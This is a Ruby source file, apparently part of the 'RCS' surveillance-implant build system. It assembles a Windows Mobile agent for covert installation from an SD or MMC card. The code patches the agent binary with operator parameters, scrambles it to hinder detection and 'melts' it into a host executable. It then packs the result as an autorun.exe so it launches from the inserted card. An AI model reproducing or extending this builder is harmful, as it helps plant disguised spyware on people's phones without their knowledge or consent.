#
# Card (SD, MMC, etc) local installation (winmo)
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildCard < Build

  def initialize
    super
    @platform = 'card'
  end

  def load(params)
    trace :debug, "Build: load: #{params}"
    @factory = params['_id']
  end

  def unpack
    # nothing to unpack here
  end

  def generate(params)
    trace :debug, "Build: generate: #{params}"

    build = Build.factory(:winmo)
    build.load({'_id' => @factory})
    build.unpack
    build.patch params['binary'].dup
    build.scramble
    build.melt params['melt'].dup

    # copy the outputs in our directory
    build.outputs.each do |o|
      FileUtils.cp(File.join(build.tmpdir, o), path(o))
      @outputs << o
    end

    build.clean
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      z.file.open('2577/autorun.exe', "w") { |f| f.write File.open(path('firststage'), 'rb') {|f| f.read} }
      z.file.open('2577/autorun.zoo', "w") { |f| f.write File.open(path('output'), 'rb') {|f| f.read} }
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']
  end

end

end #DB::
end #RCS::
